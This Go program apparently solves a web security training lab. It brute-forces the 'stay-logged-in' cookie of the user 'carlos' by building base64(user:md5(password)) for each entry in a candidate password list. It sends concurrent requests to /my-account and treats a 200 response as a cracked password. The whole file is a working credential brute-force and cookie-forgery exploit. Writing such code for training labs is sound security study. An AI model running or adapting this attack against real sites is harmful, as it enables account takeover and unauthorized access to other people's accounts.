package main

import (
	"crypto/md5"
	base64 "encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
)

func solve(hostname string) {
	/*
		What is known?
		- The cookie stay-logged-in is a base64 encoded value of user:md5hash(password), where
		md5hash is the md5 hash function.
		- Using the cookie, we can access the /my-account page without a redirect


		Steps to solve:
		- Read candidate passwords into array
		- For each candidate password:
			- Create a cookie based on base64(user:md5hash(password))
			- Use created cookie to access page /my-account
			- If redirect (302 http status), try again
			- Otherwise (200 http status), the password is known!
	*/

	candidatePasswords, err := readFromFile("assets/candidate-passwords.txt")
	if err != nil {
		log.Printf("Error reading the file %s", err)
		return
	}

	log.Printf("Found %d candidates passwords", len(candidatePasswords))

	targetUser := "carlos"
	bruteForce(hostname, targetUser, candidatePasswords)
}

func bruteForce(hostname string, targetUser string, candidatePasswords []string) {
	found := make(chan bool)
	maxRoutines := 15 // Limits the number of routines to not overflow the number of sockets that can be open

	routinesCalled := 0
	for _, password := range candidatePasswords {
		go passwordAttempt(hostname, targetUser, password, found)
		routinesCalled++

		if routinesCalled == maxRoutines {
			foundPassword := false
			for routinesCalled > 0 && !foundPassword {
				foundPassword = <-found
				routinesCalled--
			}
			if foundPassword {
				break
			}
		}
	}
}

func passwordAttempt(
	hostname string,
	targetUser string,
	candidatePassword string,
	found chan bool,
) {
	cookieValue := createCookieValue(targetUser, candidatePassword)
	log.Printf("Cookie value: %s", cookieValue)
	foundPassword, err := attemptToAccessMyAccount(hostname, cookieValue)
	if err != nil {
		log.Printf("Error while trying to access my account: %s", err)
	}

	if foundPassword {
		log.Printf("Found password! It is: %s", candidatePassword)
	}

	found <- foundPassword
}

func readFromFile(filePath string) ([]string, error) {
	fileBytes, err := ioutil.ReadFile(filePath)

	if err != nil {
		return []string{}, err
	}

	return strings.Split(string(fileBytes), "\n"), nil
}

func createCookieValue(user string, password string) string {
	passwordMD5 := md5.Sum([]byte(password))
	dataToEncode := fmt.Sprintf("%s:%x", user, passwordMD5)
	return base64.StdEncoding.EncodeToString([]byte(dataToEncode))
}

func attemptToAccessMyAccount(hostname string, cookieValue string) (bool, error) {

	url := fmt.Sprintf("%s/my-account", hostname)
	req, err := http.NewRequest(http.MethodGet, url, nil)

	if err != nil {
		return false, err
	}

	cookie := http.Cookie{Name: "stay-logged-in", Value: cookieValue}
	req.AddCookie(&cookie)

	client := makeClientWithoutRedirect()
	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}

	return resp.StatusCode == http.StatusOK, nil
}

func makeClientWithoutRedirect() *http.Client {
	return &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

func main() {
	log.SetFlags(log.LstdFlags | log.Lmicroseconds)

	hardcodedHostname := "https://acbc1fed1ea58c6480a3f7ea004d005d.web-security-academy.net"
	solve(hardcodedHostname)
}
